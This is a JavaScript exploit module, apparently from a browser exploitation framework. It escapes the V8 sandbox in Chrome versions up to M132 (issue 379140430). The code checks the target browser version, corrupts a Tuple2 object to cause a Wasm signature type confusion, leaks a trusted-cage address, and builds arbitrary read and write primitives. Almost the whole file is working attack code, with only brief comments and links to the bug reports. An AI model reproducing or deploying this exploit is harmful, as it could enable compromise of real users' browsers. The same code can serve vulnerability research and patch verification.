/*
    V8 Sandbox escape, issue 379140430 (duplicate of 369748454)
    Build arbRead() & arbWrite() primitives + leak TRUSTED_CAGE_LEAK
    Require wasm-module-builder.js

    Signature type confusion in WasmToJsWrapper tier-up with in-sandbox Tuple2 corruption

    Affected versions:
        - V8: < 13.3.212
        - Chrome Stable: <= M132

    Learning resources:
        - https://issues.chromium.org/issues/379140430
        - https://issues.chromium.org/issues/369748454
        - https://chromium-review.googlesource.com/c/v8/v8/+/6035506
*/
{
    let versioncheck = FINGERPRINT.browser.chromium_version.major <= 132;
    if (!versioncheck)
        log("[-] Target likely not vulnerable to 379140430", 1);
    assert(FINGERPRINT.platform.bitness !== "32", "[-] V8 sandbox is disabled on 32-bit systems", 0);


    // Constants
    const kWasmTableObjectEntriesOffset = 0xc;
    const kFixedArrayEntry0Offset = 0x8;
    const kTuple2Value2Offset = 0x8;
    const kMapOffset = 0;
    const kSmiTagSize = 1;


    // Sandboxed getField & setField primitives
    let getField = function (obj, offset) {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        return sbxMemory.getUint32(untagPtr(obj) + offset, true);
    }

    let setField = function (obj, offset, value) {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        sbxMemory.setUint32(untagPtr(obj) + offset, value, true);
    }


    // Search object in memory using a uint32 array pattern
    function findObject(pattern, start, stop, reload=false) {
        let patter_str = pattern.map(x => "0x"+hex(x));

        function match() {
            for (let k = 0; k < pattern.length; ++k) {
                if (sbxMemory.getUint32(untagPtr(start) + k*4, true) !== pattern[k]) return false;
            }
            return true;
        }
        while (start<stop && !match()) start += 4;

        assert(match(), `[-] Failed to find object with pattern ${patter_str} in V8 sandboxed heap`, 3, reload);

        log(`[+] Found object with pattern 0x${patter_str} at 0x${hex(start)} in V8 sandboxed heap`, 2);
        return start;
    }


    // Confuse func_exp's signature
    let confuse_sig = function (builder, $func_exp, sig, retry_find=false) {
        let $sig = builder.addType(sig);

        // Build confusion table
        let $dummy = builder.addFunction("dummy", $sig);
        let $t = builder.addTable(wasmRefType($sig), 1, 1, [kExprRefFunc, $dummy.index]).exportAs("table");

        $dummy.addBody(
            Array.from(new Array(sig.params.length), (_,k)=>[kExprLocalGet, k]).flat().concat([
            kExprI32Const, 0,
            kExprCallIndirect, $sig, $t.index,
        ])).exportFunc();

        let instance = builder.instantiate({import: {func_exp: (...v)=>v}});
        let {table, dummy} = instance.exports;

        // Export-import function with target signature
        let func_sig = (() => {
            const builder = new WasmModuleBuilder();
            let $sig = builder.addType(sig);
            let $f = builder.addImport("import", "func", $sig);
            builder.addExport("func_sig", $f);
            let instance = builder.instantiate({import: {func: (...v)=>v}});
            return instance.exports.func_sig;
        })();

        // Resolve Tuple2 map from table
        let entries_ptr = getField(addrOf(table), kWasmTableObjectEntriesOffset);
        let entry0_ptr = getField(entries_ptr, kFixedArrayEntry0Offset);
        let tuple2_map_ptr = getField(entry0_ptr, kMapOffset);

        // Set cross-instance table indexing Tuple2
        table.set(0, func_sig);

        // Find target Tuple2 (trusted-to-untrusted reference)
        // Address is likely close to table entries
        let pattern = [tuple2_map_ptr, addrOf(instance), (0 + 1) << kSmiTagSize];
        let search_start = tagPtr(entry0_ptr & ~(0x40000 - 1));
        let cross_tuple2_ptr = findObject(pattern, search_start, search_start + 0x40000, retry_find);

        // Overwrite origin as an import index for func_exp
        let tuple_value_bak = getField(cross_tuple2_ptr, kTuple2Value2Offset);
        setField(cross_tuple2_ptr, kTuple2Value2Offset, (-$func_exp - 1) << kSmiTagSize);

        // Optimize dummy
        let dummy_args = Array(sig.params.length).fill(0n);
        optimize(dummy, ...dummy_args);

        // Restore backup to prevent later crashes
        setField(cross_tuple2_ptr, kTuple2Value2Offset, tuple_value_bak);

        return instance;
    }


    // Clean memory state
    majorGC();


    // Build leak exploit function
    // Leak argument address (rax), rdx, rcx, rbx, r9, stack
    // Lifted code induce rdx = func_exp address ; rcx = trusted pointer
    let builder = new WasmModuleBuilder();
    let lX_n = 32;
    let $sig_lX_r = builder.addType(makeSig([kWasmAnyRef], Array(lX_n).fill(kWasmI64)));
    let kSig_lX_lX = makeSig(Array(lX_n).fill(kWasmI64), Array(lX_n).fill(kWasmI64))

    let $func_exp_lX_r = builder.addImport("import", "func_exp", $sig_lX_r);

    builder.addFunction("leak", $sig_lX_r).addBody([
        kExprLocalGet, 0,
        kExprCallFunction, $func_exp_lX_r,
    ]).exportFunc();

    let leak_instance = confuse_sig(builder, $func_exp_lX_r, kSig_lX_lX);

    let {leak} = leak_instance.exports;
    var TRUSTED_CAGE_LEAK = leak()[2];
    log("[+] Leaked an address in the trusted cage: 0x" + hex(TRUSTED_CAGE_LEAK), 1);


    // Build arbitrary read/write exploit functions
    builder = new WasmModuleBuilder();
    let $struct = builder.addStruct([makeField(kWasmI64, true)]);
    let $sig_s_l = builder.addType(makeSig([kWasmI64], [wasmRefType($struct)]));
    let $func_exp_s_l = builder.addImport("import", "func_exp", $sig_s_l);

    builder.addFunction("read", kSig_l_l).addBody([
        kExprLocalGet, 0,
        kExprCallFunction, $func_exp_s_l,
        kGCPrefix, kExprStructGet, $struct, 0,
    ]).exportFunc();

    builder.addFunction("write", makeSig([kWasmI64, kWasmI64], [])).addBody([
        kExprLocalGet, 0,
        kExprCallFunction, $func_exp_s_l,
        kExprLocalGet, 1,
        kGCPrefix, kExprStructSet, $struct, 0,
    ]).exportFunc();

    let rw_instance = confuse_sig(builder, $func_exp_s_l, kSig_l_l, true);  // if finding Tuple2 fails, allow reloading as we know the target is vulnerable


    // arbRead() & arbWrite() primitives
    function arbRead(addr) {
        return ui64(rw_instance.exports.read(addr-7n));
    }

    function arbWrite(addr, value) {
        rw_instance.exports.write(addr-7n, value);
    }

    assertTry(
        () => arbRead(TRUSTED_CAGE_LEAK),
        "[-] Failed to escape the V8 sandbox using issue 379140430",
    );

    log("[+] Successfully escaped the V8 sandbox using issue 379140430", 1);
}
